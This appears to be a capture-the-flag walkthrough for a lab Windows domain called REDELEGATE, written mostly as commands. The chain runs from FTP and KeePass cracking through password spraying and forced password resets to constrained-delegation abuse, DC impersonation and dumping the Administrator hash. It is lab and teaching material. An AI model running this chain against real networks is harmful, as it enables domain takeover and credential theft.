# REDELEGATE

## Enumeration

### Nmap 

    sudo nmap -sC -sV -vv <TARGET_IP>

### Nmap UDP

    sudo nmap -sU <TARGET_IP>  --top-ports 100

### Open Ports
```
21/tcp ftp
53/tcp domain
80/tcp http
88/tcp kerberos-sec
135/tcp msrpc
139/tcp netbios-ssn
389/tcp ldap
445/tcp microsoft-ds?
464/tcp kpasswd5?
593/tcp ncacn_http
636/tcp tcpwrapped
1433/tcp ms-sql-s
3268/tcp ldap
3269/tcp tcpwrapped
3389/tcp ms-wbt-server
5985/tcp http
```
### FTP

    ftp <TARGET_IP>

> Note: <br>
> - text document on FTP Server referencing use of password-format "SeasonYear!" (e.g. Fall2024!)
> - .kdbx File on FTP Server
> - made a custom wordlist with several Season + Year + ! passwords.
> - .kdbx file could be cracked with Fall2024!
> - credentials for SQLGuest user on .kdbx

### NXC Enumeration - Local-Auth

    nxc mssql <TARGET_IP> -u <USER> -p <PASSWORD> --local-auth

### Impacket-MSSQLclient - Local-Auth

    impacket-mssqlclient <USER>@10.129.234.50 

> Note: <br>
> - tried msfconsole aux module admin/mssql/mssql_enum_domain_accounts
> - got a list of users

## Foothold

### Users
```
REDELEGATE\DC$               
REDELEGATE\FS01$             
REDELEGATE\Christine.Flanders
REDELEGATE\Marie.Curie       
REDELEGATE\Helen.Frost       
REDELEGATE\Michael.Pontiac   
REDELEGATE\Mallory.Roberts   
REDELEGATE\James.Dinkleberg  
REDELEGATE\Helpdesk          
REDELEGATE\IT                
REDELEGATE\Finance           
REDELEGATE\DnsAdmins         
REDELEGATE\DnsUpdateProxy    
REDELEGATE\Ryan.Cooper       
REDELEGATE\sql_svc           
```

### Credential Stuffing - SMB

    nxc smb <TARGET_IP> -u users.list -p passwords.list

> Note: <br>
> - created a bigger wordlist with SeasonYear! format
> - used the usernames
> - found valid credentials REDELEGATE\Marie.Curie:Fall2024!
> - enumerated using Bloodhound
> - Marie.Curie > Member of Helpdesk group > Helpdesk group had ForcePassword on Helen.Frost

### Net Rpc - Changing Password

    net rpc password "<TARGET_USER>" "newP@ssword2022" -U "<DOMAIN>"/"<USER>"%"<PASSWORD>" -S "<DOMAIN>"

### NXC - Verify Change

    nxc smb <TARGET_IP> -u <TARGET_USER> -p newP@ssword2022

> Note: <br>
> - Winrm into target, user flag on Desktop

## Post Exploitation

### Check Privileges

    whoami /priv

### Privileges

```
PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                                 
                   State
============================= ============================================================== =======
SeMachineAccountPrivilege     Add workstations to domain                  
                   Enabled
SeChangeNotifyPrivilege       Bypass traverse checking                    
                   Enabled
SeEnableDelegationPrivilege   Enable computer and user accounts to be trus
ted for delegation Enabled
SeIncreaseWorkingSetPrivilege Increase a process working set              
                   Enabled

```

> Note: <br>
> - SeEnableDelegationPrivilege allows for a user to set delegation flags on owned resources
> - bloodhound showed Helen.Frost is member if IT group > has GenericAll on host FS01

## Privilege Escalation

### Request TGT for Helen.Frost

    impacket-getTGT <DOMAIN>/<USER>:'<PASSWORD>'

### Update KRB5CCNAME env var

    export KRB5CCNAME=<USER>.ccache

### Update FS01 Passord - bloodyAD (download from GitHub)

    python3 bloodyAD.py -d <DOMAIN> -k --host <DC> set password <NEW_HOST>$ 'Password1'

### Verify

    netexec smb <DOMAIN> -u <NEW_HOST> -p 'Password1'

### Set TRUSTED_TO_AUTH_FOR_DELEGATION

    python3 bloodyAD.py -d <DOMAIN> -k --host <DC> add uac <NEW_HOST>$ -f TRUSTED_TO_AUTH_FOR_DELEGATION


### Set msDS-AllowedToDelegateTo

    python3 bloodyAD.py -d <DOMAIN> -k --host <DC> set object <NEW_HOST>$ msDS-AllowedToDelegateTo -v 'cifs/dc.redelegate.vl'


### Impersonate DC

    
    impacket-getST <DOMAIN>/<NEW_HOST>\$:'Password1' -spn cifs/<DC> -impersonate dc


### Dump Admin Hash

    impacket-secretsdump -k <DC> -just-dc-user Administrator


